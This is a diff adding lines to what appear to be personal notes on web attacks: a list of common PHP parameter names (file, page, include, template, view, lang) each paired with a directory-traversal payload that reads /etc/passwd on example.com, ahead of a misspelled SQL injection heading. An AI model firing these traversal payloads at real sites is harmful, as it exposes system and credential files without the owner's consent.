@@ -10,6 +10,16 @@ So our example would chnage too - example - http://example.com/index.php?page=./
 
 .. = parent directory
 / = directory separator
+
+F-P-I-T-V-L
+
+file - http://example.com/index.php?file=../../../../etc/passwd
+page - http://example.com/index.php?page=../../../../etc/passwd
+include - http://example.com/index.php?include=../../../../etc/passwd
+template - http://example.com/index.php?template=../../../../etc/passwd
+view - http://example.com/index.php?view=../../../../etc/passwd
+lang - http://example.com/index.php?lang=../../../../etc/passwd
+
 ------------------------------------------------------------------------------------------
 SLQ injection
 ------------------------------------------------------------------------------------------
